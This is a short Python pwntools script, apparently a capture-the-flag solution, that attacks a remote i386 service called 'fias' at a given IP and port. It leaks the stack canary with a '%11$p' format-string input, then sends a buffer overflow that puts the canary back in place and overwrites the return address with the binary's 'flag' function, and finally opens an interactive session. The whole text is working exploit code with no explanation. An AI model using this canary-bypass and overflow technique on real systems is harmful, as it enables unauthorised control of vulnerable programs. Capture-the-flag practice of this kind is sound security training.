from pwn import *
from re import findall

context(os='linux',arch='i386',log_level='debug')

flag=0x080491D2
#p=process('./fias')
p=remote('95.216.233.106',33280)
elf=ELF('./fias')
#p.clean(0.2)

#payload = 'a'*248
#payload += p32(flag)
#gdb.attach(p, 'b *0x08049252')
#payload = 'AAAA' + '.%p'*40
p.recvuntil('Hi! What\'s your name? ')
#raw_input()
p.sendline('%11$p')
canary=p.recvline().decode('latin-1')
print "canary:" + canary
canary=findall(r"0x[0-9A-Fa-f]*00", canary)[0]
print "canary:" + canary
canary=int(canary,16)
print "canary:" + str(canary)

#leakdata=line[len('Nice to meet you, '): -1]
#print 'LeakData: ' + str(hex(leakdata))
payload='a'*25
payload += p32(canary)
payload += 'a'*12
payload += p32(elf.symbols['flag'])

p.recvuntil('Do YOU want to pet my canary?\n')
p.sendline(payload)
p.recvline()
p.interactive()

